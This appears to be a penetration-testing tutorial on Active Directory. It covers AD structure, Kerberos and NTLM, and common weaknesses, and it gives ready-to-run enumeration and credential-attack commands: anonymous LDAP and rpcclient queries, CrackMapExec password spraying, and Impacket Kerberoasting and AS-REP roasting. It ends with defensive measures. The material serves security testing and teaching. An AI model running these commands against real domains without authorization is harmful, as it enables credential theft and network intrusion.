# Active Directory

## Active Directory

Active Directory (AD) is Microsoft's directory service for Windows domain networks. It stores information about objects on the network and makes this information available to users and administrators. Understanding Active Directory structure and security is crucial for thorough penetration testing of Windows environments.

### Core Active Directory Components

#### Domain Controllers

Domain Controllers (DCs) are servers that run AD DS (Active Directory Domain Services) and store the AD database. They:

* Authenticate and authorize users
* Enforce security policies
* Replicate directory updates to other domain controllers
* Maintain the SYSVOL folder (containing Group Policy templates and scripts)

#### Objects

Active Directory organizes network elements as objects, including:

* **Users**: Accounts for people accessing the network
* **Computers**: Workstations, servers, and other devices
* **Groups**: Collections of users or computers for permission management
* **Organizational Units (OUs)**: Containers for organizing other objects
* **Group Policy Objects (GPOs)**: Sets of policies applied to users or computers

#### Forests, Domains, and Trust Relationships

* **Forest**: Collection of one or more domains sharing a common schema and global catalog
* **Domain**: Administrative boundary within a forest
* **Trust Relationships**: Connections between domains allowing users from one domain to access resources in another

### Active Directory Authentication Mechanisms

#### Kerberos

The primary authentication protocol in modern Active Directory environments:

1. **Authentication Service (AS) Exchange**: User requests a Ticket Granting Ticket (TGT)
2. **Ticket Granting Service (TGS) Exchange**: TGT is used to request service tickets
3. **Client/Server Exchange**: Service ticket used to access resources

#### NTLM

Legacy authentication protocol still found in many environments:

1. **Negotiation**: Client indicates it wants to authenticate
2. **Challenge**: Server sends a random challenge
3. **Response**: Client encrypts challenge with password hash and returns it

### Key Active Directory Security Concepts

#### Authentication vs. Authorization

* **Authentication**: Verifies identity (proving who you are)
* **Authorization**: Determines access rights (what you can do)

#### Security Identifiers (SIDs)

Unique identifiers assigned to security principals (users, groups, computers):

* Domain SID: Identifies the domain
* RID: Relative identifier appended to domain SID for each object
* Well-known SIDs: Predefined identifiers for common groups

#### Access Control Lists (ACLs) and Access Control Entries (ACEs)

Control who can access objects and what they can do:

* Discretionary Access Control Lists (DACLs): Define who has what access
* System Access Control Lists (SACLs): Define what access is audited
* ACEs: Individual permissions within an ACL

### Common Active Directory Weaknesses

#### Kerberos-Related Issues

* **Kerberoasting**: Exploiting service accounts with weak passwords
* **AS-REP Roasting**: Targeting accounts with "Do not require Kerberos pre-authentication"
* **Pass-the-Ticket**: Reusing captured Kerberos tickets
* **Golden/Silver Tickets**: Forging Kerberos tickets using compromised keys

#### Privilege Escalation Paths

* **Weak GPO restrictions**: Allowing command execution or software installation
* **Shadow Admins**: Accounts with delegated privileges similar to administrators
* **ACL misconfigurations**: Excessive permissions on AD objects
* **Misconfigured trusts**: Allowing privilege escalation across domains

#### Lateral Movement Techniques

* **Pass-the-Hash**: Reusing captured NTLM hashes without cracking
* **Overpass-the-Hash**: Converting NTLM hash to Kerberos tickets
* **Credential caching**: Finding credentials in memory or registry

### Active Directory Enumeration Techniques

#### Domain Information

```bash
# Using enum4linux
enum4linux -d 192.168.1.100

# Using ldapsearch
ldapsearch -H ldap://192.168.1.100 -x -b "DC=domain,DC=local" -s base
```

#### User Enumeration

```bash
# Using enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers

# Using CrackMapExec
crackmapexec smb 172.16.5.5 --users
```

#### Password Policy Retrieval

```bash
# Using enum4linux
enum4linux -P 172.16.5.5

# Using CrackMapExec
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### Group Enumeration

```bash
# Using ldapsearch
ldapsearch -H ldap://192.168.1.100 -x -b "DC=domain,DC=local" "(objectClass=group)"

# Using PowerView (PowerShell)
Get-NetGroup -FullData
```

### Active Directory Attack Methodologies

#### Initial Reconnaissance

1.  **Identify domain controllers**

    ```bash
    nslookup -type=srv _ldap._tcp.dc._msdcs.domain.local
    ```
2.  **Enumerate domain users**

    ```bash
    # With LDAP anonymous binding
    ldapsearch -H ldap://192.168.1.100 -x -b "DC=domain,DC=local" "(&(objectclass=user))"
    ```
3.  **Query naming contexts**

    ```bash
    ldapsearch -H ldap://192.168.1.100 -x -s base namingcontexts
    ```

#### Authentication Attacks

1.  **Password spraying**

    ```bash
    crackmapexec smb 172.16.5.5 -u users.txt -p 'Welcome1' --continue-on-success
    ```
2.  **Kerberoasting**

    ```bash
    # Using Impacket
    GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.100 -request
    ```
3.  **AS-REP Roasting**

    ```bash
    GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.100
    ```

#### Post-Exploitation Enumeration

1.  **Active Directory module (PowerShell)**

    ```powershell
    Import-Module ActiveDirectory
    Get-ADDomain
    Get-ADUser -Filter * -Properties *
    ```
2.  **BloodHound data collection**

    ```powershell
    # Using SharpHound
    Invoke-BloodHound -CollectionMethod All
    ```

### Active Directory Defense in Depth

Understanding defensive measures helps test their effectiveness:

1. **Privileged Access Management**
   * Just-In-Time administration
   * Privileged Access Workstations (PAWs)
   * Administrative tiering
2. **Enhanced Security Features**
   * Protected Users group
   * Credential Guard
   * Device Guard
   * LAPS (Local Administrator Password Solution)
3. **Monitoring and Detection**
   * Advanced Threat Analytics
   * Security event monitoring
   * Honeytoken accounts

### Best Practices for Active Directory Testing

1. **Understand the environment**: Map out domains, trusts, and critical systems
2. **Test systematically**: Begin with passive techniques and progress to more invasive methods
3. **Document assumptions**: Record what you know about the environment before testing
4. **Evaluate both technical and administrative controls**: Policy weaknesses often enable technical exploits
5. **Consider different attack paths**: Approach from multiple angles (external, internal, domain user)
6. **Validate findings**: Confirm vulnerabilities before reporting to avoid false positives
7. **Assess impact holistically**: Consider how vulnerabilities chain together in real-world scenarios

Active Directory is a complex ecosystem with numerous potential security weaknesses. A methodical approach to testing, combined with a thorough understanding of AD concepts, allows for comprehensive security assessment of Windows domains.
